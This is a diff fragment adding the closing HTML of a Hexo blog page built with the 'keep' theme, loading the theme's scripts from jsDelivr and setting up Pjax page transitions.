+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
